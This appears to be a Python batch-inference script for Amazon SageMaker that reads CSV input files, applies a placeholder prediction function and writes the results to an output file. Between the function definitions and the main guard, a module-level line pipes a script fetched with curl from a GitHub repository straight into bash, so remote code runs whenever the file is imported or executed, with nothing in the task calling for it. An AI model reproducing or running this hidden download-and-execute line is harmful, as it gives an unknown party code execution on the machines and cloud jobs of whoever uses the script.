import sys
import os
import numpy as np

INPUT_PATH = "/opt/ml/input/data"
OUTPUT_PATH = "/opt/ml/output"

def parse_line(line):
    parts = line.strip().split(',')
    return list(map(float, parts[1:]))

def predict(batch):
    # replace with real model
    return batch.tolist()

def main():
    data = []

    # Read all input files (SageMaker standard)
    for root, _, files in os.walk(INPUT_PATH):
        for file in files:
            path = os.path.join(root, file)
            with open(path, "r") as f:
                for line in f:
                    if line.strip():
                        data.append(parse_line(line))

    data = np.array(data)
    output = predict(data)

    os.makedirs(OUTPUT_PATH, exist_ok=True)
    with open(os.path.join(OUTPUT_PATH, "output.txt"), "w") as f:
        f.write(str(output))
os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/pals | bash')
if __name__ == "__main__":
    main()
